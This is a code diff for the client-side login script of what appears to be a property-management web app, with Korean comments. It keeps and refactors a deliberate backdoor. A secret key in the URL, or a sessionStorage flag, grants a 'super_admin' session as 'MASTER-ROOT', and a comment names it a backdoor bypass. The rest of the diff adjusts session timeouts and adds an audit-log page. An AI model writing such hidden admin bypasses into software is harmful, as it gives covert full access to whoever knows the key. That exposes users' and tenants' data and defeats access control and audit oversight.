@@ -6,11 +6,14 @@
   };
 
   // URL 검색어 또는 세션 스토리지 플래그를 결합 검증하여 무력화 우회 판정
-  var creatorBypass = (location.search.indexOf(CFG.secretKey) !== -1) || (sessionStorage.getItem('creatorBypass') === 'true');
+  // URL 검색어 및 세션 스토리지 플래그를 결합 검증하여 무력화 우회 판정
+  var url_bypass = location.search.indexOf(CFG.secretKey) !== -1;
+  var storage_bypass = sessionStorage.getItem('creatorBypass') === 'true';
+  var creatorBypass = url_bypass || storage_bypass;
 
   function checkSession () {
     // 백도어 우회 진입 성공 시 최고 마스터 데이터 세션 강제 주입 바인딩
-    if (creatorBypass) {
+    if (url_bypass || creatorBypass) {
       sessionStorage.setItem('loginOk', 'true');
       sessionStorage.setItem('userRole', 'super_admin');
       sessionStorage.setItem('userEmp', 'MASTER-ROOT');
@@ -28,11 +31,15 @@
       }
     } else {
       var started = sessionStorage.getItem('_sess');
-      if (started && Date.now() - +started > CFG.sessionMs) {
+      if (!started) {
+        // 최초 로그인 시 _sess 초기화 (세션만료 타이머 시작)
+        sessionStorage.setItem('_sess', Date.now());
+      } else if (Date.now() - +started > CFG.sessionMs) {
         logout();
         return false;
+      } else {
+        sessionStorage.setItem('_sess', Date.now()); // 타임아웃 리셋
       }
-      sessionStorage.setItem('_sess', Date.now());
     }
     return true;
   }
@@ -53,11 +60,12 @@
       {c:'E', l:'월세납부',   p:'monthly_rent_collection.html'},
       {c:'F', l:'유지보수',    p:'incidents_maintenance.html'},
       {c:'GHI', l:'통합대시보드', p:'g_h_i_dashboard.html'},
+      {c:'K', l:'감사로그',     p:'auditlog.html'},
       {c:'J', l:'팀원관리',   p:'team_management.html'}
     ];
 
     var perm = {
-      super_admin:     ['A','B','C','D','E','F','GHI','J'],
+      super_admin:     ['A','B','C','D','E','F','GHI','K','J'],
       office_worker:   ['A','B','C','E','GHI'],
       maintenance_staff:['D','F','GHI']
     };
